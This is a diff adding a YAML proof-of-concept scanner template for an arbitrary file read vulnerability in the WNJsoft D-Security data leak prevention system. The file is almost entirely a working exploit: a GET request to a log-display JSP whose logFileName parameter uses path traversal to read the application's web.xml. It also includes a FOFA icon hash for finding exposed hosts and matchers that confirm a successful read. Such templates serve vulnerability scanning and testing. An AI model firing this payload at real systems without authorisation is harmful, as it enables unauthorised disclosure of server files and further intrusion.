@@ -1,0 +1,16 @@
+id: poc-yaml-wnjsoft-security-displaylog-fileread
+info:
+  name: WNJsoft D-Security数据仿泄露系统(DLP) sys_ds_logfile_displaylog存在任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: WNJsoft D-Security
+  fofa: icon_hash="616947260"
+requests:
+- method: GET
+  path: /DLP/public/admintool/system_setting/sys_ds_logfile_displaylog.jsp?logType=tomcat&logFileName=../../../../../../D-Security/webapps/DLPWebApps/WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"</init-param>\") &&\ncontains(body,\"\
+    </url-pattern>\") &&\ncontains(body,\"</servlet-class>\") &&\ncontains(body,\"\
+    </servlet>\") &&\ncontains(body,\"</web-app>\")\n"
+variables: {}
+transport: http
